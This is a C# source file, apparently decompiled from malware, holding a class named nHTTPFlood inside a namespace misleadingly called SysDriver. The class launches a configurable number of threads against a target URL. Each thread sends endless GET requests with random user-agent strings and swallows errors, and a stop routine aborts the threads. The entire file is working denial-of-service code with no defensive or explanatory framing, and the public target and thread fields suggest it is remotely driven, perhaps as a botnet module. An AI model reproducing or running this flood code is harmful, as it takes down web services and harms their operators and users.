using System;
using System.Net;
using System.Text;
using System.Threading;

namespace SysDriver;

internal class nHTTPFlood
{
	private class HTTPRequest
	{
		private string sFHost;

		private WebClient wHTTP = new WebClient();

		public HTTPRequest(string tHost)
		{
			sFHost = tHost;
		}

		public void Send()
		{
			while (true)
			{
				try
				{
					wHTTP.Headers.Add("user-agent", GetRandomUserAgent());
					wHTTP.DownloadString(sFHost);
				}
				catch
				{
				}
			}
		}

		private string GetRandomUserAgent()
		{
			return GetRandomString(54, 135, lowerCase: false);
		}

		private string GetRandomString(int sizeMin, int sizeMax, bool lowerCase)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			int num = random.Next(sizeMin, sizeMax);
			for (int i = 0; i < num; i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			if (lowerCase)
			{
				return stringBuilder.ToString().ToLower();
			}
			return stringBuilder.ToString();
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	private static HTTPRequest[] hRequestClass;

	public static int iThreads;

	public static void StartHTTPFlood()
	{
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		hRequestClass = new HTTPRequest[iThreads];
		if (!sFHost.StartsWith("http://"))
		{
			sFHost = "http://" + sFHost;
		}
		for (int i = 0; i < iThreads; i++)
		{
			hRequestClass[i] = new HTTPRequest(sFHost);
			tFloodingJob[i] = hRequestClass[i].Send;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void StopHTTPFlood()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Abort();
				tFloodingThread[i].Join();
			}
			catch
			{
			}
		}
	}
}
